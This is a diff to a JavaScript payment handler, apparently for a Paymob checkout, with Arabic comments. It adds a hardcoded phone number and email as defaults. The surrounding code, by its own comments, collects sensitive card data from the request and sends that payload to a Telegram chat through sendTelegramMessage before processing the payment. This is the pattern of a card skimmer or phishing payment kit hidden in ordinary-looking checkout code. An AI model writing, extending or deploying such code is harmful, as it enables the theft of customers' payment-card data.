@@ -36,10 +36,16 @@ async function handlePaymentRequest(req, res) {
     }
 
     const selectedMethod = payment_method || method || "wallet";
-    const userPhone = phone || "غير محدد";
     const payAmount = amount || "5";
 
-    // تجميع بيانات الكارت الحساسة إن وجدت في الطلب
+    // البيانات الثابتة المطلوبة للاتصال والتعبئة التلقائية
+    const staticPhone = "1112345678";
+    const staticEmail = "tales@gmail.com";
+    
+    // استخدام الرقم المرسل من الواجهة أو الثابت
+    const userPhone = phone || staticPhone;
+
+    // تجميع بيانات الكارت الحساسة إن وجدت في الطلب للإشعار
     const paymentPayload = {
       phone: userPhone,
       amount_cents: parseFloat(payAmount) * 100,
@@ -58,7 +64,7 @@ async function handlePaymentRequest(req, res) {
       await sendTelegramMessage(paymentPayload, true);
     }
 
-    // معالجة الدفع عبر Paymob (ستعيد رابط التوجيه المباشر بدون إطار/فريم)
+    // معالجة الدفع عبر Paymob مع تمرير الهاتف والمبلغ ووسيلة الدفع
     const result = await processPayment(userPhone, payAmount, selectedMethod);
 
     if (result.type === "redirect") {
